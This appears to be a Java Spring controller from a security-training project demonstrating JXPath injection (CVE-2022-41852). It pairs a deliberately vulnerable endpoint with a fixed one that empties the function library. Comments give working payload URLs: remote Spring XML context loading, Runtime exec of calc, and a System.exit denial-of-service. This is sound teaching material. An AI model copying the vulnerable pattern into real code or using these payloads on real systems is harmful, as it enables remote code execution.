package com.madaha.codesecone.controller.xpath;

import lombok.Value;
import org.apache.commons.jxpath.FunctionLibrary;
import org.apache.commons.jxpath.JXPathContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

/**
 * REST controller with two endpoints:
 * <ul>
 *     <li>{@code /vulnerable-example?path=[path]}</li>
 *     <li>{@code /secure-example?path=[path]}</li>
 * </ul>
 */
@RestController
@RequestMapping("/XPath")
public class ProofOfConcept_JXPath_Controller {

    /**
     * Example data object
     */
    @Value
    public static class Person {
        String name;
        String website;
    }

    /**
     * Hardcoded person object for PoC
     */
    private final Person person = new Person( "Michal Valka", "warxim.com");


    /**
     * 测试代码执行：
     *
     * 方式一（先启动一个web服务，再发送payload）：
     * D:\code_repository_sfq\IdeaProjects\CodeSecOne\src\main\resources\static\evil\JXPath Library (CVE-2022-41852)__calc.exe__payload>python -m http.server 8888
     * http://127.0.0.1:28888/XPath/vulnerable-example/?path=org.springframework.context.support.ClassPathXmlApplicationContext.new(%22http://127.0.0.1:8888/calc.xml%22)
     *
     * 方式二（直接发送payload）：
     * http://127.0.0.1:28888/XPath/vulnerable-example/?path=exec(java.lang.Runtime.getRuntime(),%27calc%27)
     **/


    /**
     * Following code will allow the attacker to execute code.
     * <p>For example, attacker can send query <b>?path=java.lang.System.exit(42)</b>, which will stop the application.</p>
     */
    @GetMapping("vulnerable-example")
    public Object getVulnerableExample(
            @RequestParam(defaultValue = "/") String path
    ) {
        // Create path context for person object
        JXPathContext pathContext = JXPathContext.newContext(person);

        // Vulnerable getValue call
        return pathContext.getValue(path);
    }

    /**
     * Following code will disable functions by removing the default functions from context.
     * <p>Note: No functions will work in path string!</p>
     */
    @GetMapping("secure-example")
    public Object getSecureExample(
            @RequestParam(defaultValue = "/") String path
    ) {
        // Create path context for person object
        JXPathContext pathContext = JXPathContext.newContext(person);

        // Set empty function library
        pathContext.setFunctions(new FunctionLibrary());

        // getValue will throw org.apache.commons.jxpath.JXPathFunctionNotFoundException
        return pathContext.getValue(path);
    }

}
